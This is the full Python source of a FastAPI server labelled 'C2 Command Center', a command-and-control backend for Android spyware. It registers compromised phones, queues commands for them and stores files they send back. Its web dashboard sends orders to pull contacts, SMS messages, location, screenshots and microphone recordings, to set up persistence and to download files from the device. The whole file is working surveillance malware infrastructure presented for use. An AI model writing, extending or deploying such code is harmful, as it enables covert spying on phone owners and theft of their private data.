import uuid, datetime, base64, os, json
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

app = FastAPI()
agents = {}
commands = {}
os.makedirs("downloads", exist_ok=True)

class Reg(BaseModel):
    id: str
    model: str = ""
    android: str = ""

class Cmd(BaseModel):
    cmd: str

class Res(BaseModel):
    id: str
    out: str

@app.post("/register")
def register(r: Reg):
    agents[r.id] = {"model": r.model, "android": r.android,
                    "last": datetime.datetime.utcnow().isoformat()}
    commands.setdefault(r.id, [])
    return {"ok": True}

@app.get("/poll/{aid}")
def poll(aid: str):
    if aid not in agents:
        return {"cmds": []}
    pending = [c for c in commands.get(aid, []) if c["status"] == "pending"]
    return {"cmds": [{"id": c["id"], "cmd": c["cmd"]} for c in pending]}

@app.post("/result/{aid}")
def result(aid: str, r: Res):
    for c in commands.get(aid, []):
        if c["id"] == r.id:
            c["status"] = "done"
            c["out"] = r.out
            try:
                data = json.loads(r.out)
                if "name" in data and "data" in data:
                    fname = data["name"]
                    fdata = base64.b64decode(data["data"])
                    fpath = os.path.join("downloads", f"{aid}_{fname}")
                    with open(fpath, "wb") as f:
                        f.write(fdata)
                    c["out"] = f"FILE_SAVED: {fpath} ({len(fdata)} bytes)"
            except Exception:
                pass
    return {"ok": True}

@app.post("/command/{aid}")
def issue(aid: str, c: Cmd):
    cid = str(uuid.uuid4())[:8]
    commands.setdefault(aid, []).append(
        {"id": cid, "cmd": c.cmd, "status": "pending", "out": None})
    return {"id": cid}

@app.get("/agents")
def list_agents():
    return agents

@app.get("/results/{aid}")
def results(aid: str):
    return commands.get(aid, [])

# ==========================================
# GUI DASHBOARD (Web Interface)
# ==========================================
@app.get("/", response_class=HTMLResponse)
def dashboard():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command Center</title>
    <style>
        :root { --bg: #0a0a0c; --panel: #141418; --text: #e0e0e0; --accent: #00ff88; --danger: #ff3366; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--accent); padding-bottom: 10px; margin-bottom: 20px; }
        .header h1 { margin: 0; color: var(--accent); font-size: 24px; }
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; height: calc(100vh - 100px); }
        .panel { background: var(--panel); padding: 15px; border-radius: 8px; border: 1px solid #333; overflow-y: auto; display: flex; flex-direction: column; }
        .agent-card { background: #1e1e24; padding: 10px; margin-bottom: 10px; border-left: 4px solid var(--accent); cursor: pointer; border-radius: 4px; transition: 0.2s; }
        .agent-card:hover { background: #2a2a35; }
        .agent-card.active { background: #2a2a35; border-left-color: var(--danger); }
        .agent-card strong { display: block; color: var(--accent); margin-bottom: 5px; }
        .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        button { background: transparent; color: var(--accent); border: 1px solid var(--accent); padding: 8px 15px; border-radius: 4px; cursor: pointer; transition: 0.2s; font-weight: bold; }
        button:hover { background: var(--accent); color: var(--bg); }
        input { background: #000; border: 1px solid #444; color: var(--accent); padding: 8px; border-radius: 4px; width: 100%; margin-bottom: 10px; font-family: monospace; }
        textarea { width: 100%; height: calc(100% - 150px); background: #000; border: 1px solid #444; color: #fff; padding: 10px; border-radius: 4px; font-family: monospace; resize: none; box-sizing: border-box; }
        .path-input { display: flex; gap: 10px; }
        .path-input input { flex: 1; }
    </style>
</head>
<body>
    <div class="header">
        <h1>// C2 COMMAND CENTER</h1>
        <div id="clock"></div>
    </div>
    <div class="grid">
        <div class="panel">
            <h3 style="margin-top:0; color:var(--accent);">Connected Agents</h3>
            <div id="agentList"></div>
        </div>
        <div class="panel">
            <h3 style="margin-top:0; color:var(--accent);">Controls & Output</h3>
            <div class="path-input">
                <input type="text" id="filePath" placeholder="/sdcard/Download" value="/sdcard/Download">
            </div>
            <div class="controls">
                <button onclick="sendCmd('info')">System Info</button>
                <button onclick="sendCmd('contacts')">Contacts</button>
                <button onclick="sendCmd('sms')">SMS</button>
                <button onclick="sendCmd('location')">Location</button>
                <button onclick="sendCmd('screenshot')">Screenshot</button>
                <button onclick="sendCmd('mic 10')">Mic (10s)</button>
                <button onclick="sendCmd('persist')">Persist</button>
                <button onclick="sendCmd('ls ' + document.getElementById('filePath').value)">List Files</button>
                <button onclick="sendCmd('download ' + document.getElementById('filePath').value)" style="border-color:var(--danger); color:var(--danger);">Download File</button>
            </div>
            <textarea id="output" readonly>Select an agent to start.</textarea>
        </div>
    </div>

    <script>
        let currentAid = null;
        const agentList = document.getElementById('agentList');
        const output = document.getElementById('output');

        setInterval(() => {
            document.getElementById('clock').innerText = new Date().toLocaleTimeString();
        }, 1000);

        async function loadAgents() {
            try {
                const res = await fetch('/agents');
                const agents = await res.json();
                agentList.innerHTML = '';
                Object.keys(agents).forEach(id => {
                    const a = agents[id];
                    const div = document.createElement('div');
                    div.className = 'agent-card' + (currentAid === id ? ' active' : '');
                    div.innerHTML = `<strong>${a.model}</strong>Android: ${a.android}<br>ID: ${id.substring(0,8)}...`;
                    div.onclick = () => {
                        currentAid = id;
                        loadAgents();
                        output.value = `Target Selected: ${id}\\nReady.`;
                    };
                    agentList.appendChild(div);
                });
            } catch (e) { console.error(e); }
        }

        async function sendCmd(cmd) {
            if (!currentAid) { alert('Select an agent first!'); return; }
            output.value = `Sending command: ${cmd}\\nAwaiting agent...`;
            
            try {
                await fetch('/command/' + currentAid, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({cmd: cmd})
                });
                
                setTimeout(async () => {
                    const res = await fetch('/results/' + currentAid);
                    const data = await res.json();
                    const lastCmd = data[data.length - 1];
                    if (lastCmd && lastCmd.status === 'done') {
                        output.value = `[+] Command Executed: ${lastCmd.cmd}\\n\\n[OUTPUT]\\n` + lastCmd.out;
                    } else {
                        output.value = `[-] Still waiting or command failed.`;
                    }
                }, 6000);
            } catch (e) { output.value = 'Error: ' + e.message; }
        }

        loadAgents();
        setInterval(loadAgents, 10000);
    </script>
</body>
</html>
    """